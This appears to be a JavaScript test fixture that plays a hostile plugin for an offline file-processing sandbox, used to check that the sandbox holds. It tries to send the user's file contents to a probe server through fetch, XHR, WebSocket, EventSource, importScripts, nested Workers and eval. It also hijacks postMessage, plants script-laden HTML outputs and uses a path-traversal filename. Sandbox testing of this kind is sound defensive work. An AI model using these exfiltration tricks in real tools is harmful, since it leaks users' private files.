// TEST-ONLY hostile tool. Built only by the tests, into a separate site, never
// into web/dist. It plays a malicious or broken third-party tool: from inside
// its processing Worker, holding the user's file, it tries to reach the
// network and to smuggle results the contract forbids. The input file's text
// names the probe server to aim at ("PROBE=<origin>").

/* global OfflineSealTool */

(() => {
  const png = () => new Blob([new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3])], { type: 'image/png' });
  const attempt = async (name, fn) => {
    try {
      const r = await fn();
      return `${name}: ${r}`;
    } catch (e) {
      return `${name}: threw ${e && e.name}`;
    }
  };

  OfflineSealTool.define({
    async inspect([file]) {
      return { summary: [`${file.size} bytes`] };
    },

    async run([file], params) {
      const text = await file.text();
      const probe = (/PROBE=(\S+)/.exec(text) || [])[1] || 'http://127.0.0.1:9';
      const secret = encodeURIComponent(text.slice(0, 64));

      if (params.variant === 'bypass-host') {
        // Go around the runtime's Worker host: rewrite its already-validated
        // reply on the way out, swapping the output for an HTML file.
        const real = self.postMessage.bind(self);
        self.postMessage = (msg, transfer) => {
          if (msg && msg.type === 'processing-complete') {
            msg = { ...msg, result: { ...msg.result, outputs: [{ file: new Blob([`<script>fetch('${probe}/bypass')</script>`], { type: 'text/html' }), name: 'evil.html', summary: '' }] } };
          }
          real(msg, transfer);
        };
      }

      if (params.variant === 'post-junk') {
        // Talk to the frame outside the protocol, then answer normally.
        for (const junk of [{ type: 'fetch-url', url: `${probe}/junk` }, { protocol: 'offlineseal.worker.v2', type: 'open-url', url: probe }, 'eval:alert(1)']) self.postMessage(junk);
      }

      switch (params.attack) {
        case 'network': {
          const lines = await Promise.all([
            attempt('fetch', () => fetch(`${probe}/hostile-fetch?d=${secret}`).then(() => 'REACHED', () => 'refused')),
            attempt('post', () => fetch(`${probe}/hostile-post`, { method: 'POST', body: text }).then(() => 'REACHED', () => 'refused')),
            attempt('xhr', () => new Promise((r) => { const x = new XMLHttpRequest(); x.open('POST', `${probe}/hostile-xhr`); x.onload = () => r('REACHED'); x.onerror = () => r('refused'); x.send(text); })),
            attempt('websocket', () => new Promise((r) => { const w = new WebSocket(probe.replace('http', 'ws') + '/hostile-ws'); w.onopen = () => r('REACHED'); w.onerror = () => r('refused'); })),
            attempt('eventsource', () => new Promise((r) => { const s = new EventSource(`${probe}/hostile-sse?d=${secret}`); s.onopen = () => r('REACHED'); s.onerror = () => { s.close(); r('refused'); }; })),
            attempt('importScripts', () => { importScripts(`${probe}/hostile-import?d=${secret}`); return 'REACHED'; }),
            attempt('worker', () => { new Worker(URL.createObjectURL(new Blob([`fetch('${probe}/hostile-nested')`]))); return 'REACHED'; }),
            attempt('eval', () => eval(`fetch('${probe}/hostile-eval'); 'REACHED'`)),
          ]);
          return { summary: lines, outputs: [{ file: png(), name: 'network.png', summary: '' }] };
        }
        case 'html-output':
          return { summary: ['html'], outputs: [{ file: new Blob([`<script>fetch('${probe}/from-download?d=${secret}')</script>`], { type: 'text/html' }), name: 'report.html', summary: '' }] };
        case 'undeclared':
          return { summary: ['pdf'], outputs: [{ file: new Blob(['%PDF-1.4'], { type: 'application/pdf' }), name: 'x.pdf', summary: '' }] };
        case 'too-many':
          return { summary: ['many'], outputs: [1, 2, 3].map((i) => ({ file: png(), name: `${i}.png`, summary: '' })) };
        case 'fake-blob':
          return { summary: ['fake'], outputs: [{ file: { type: 'image/png', size: 3, bytes: text }, name: 'x.png', summary: '' }] };
        case 'rename':
          return {
            summary: [params.variant === 'long-summary' ? 'x'.repeat(5000) : 'renamed'],
            outputs: [{ file: png(), name: '../../../evil.html', summary: '' }],
          };
        case 'hang':
          return new Promise(() => {});
        case 'crash':
          setTimeout(() => {
            throw new Error('hostile crash');
          }, 0);
          return new Promise(() => {});
      }
      return { summary: ['?'], outputs: [{ file: png(), name: 'x.png', summary: '' }] };
    },
  });
})();
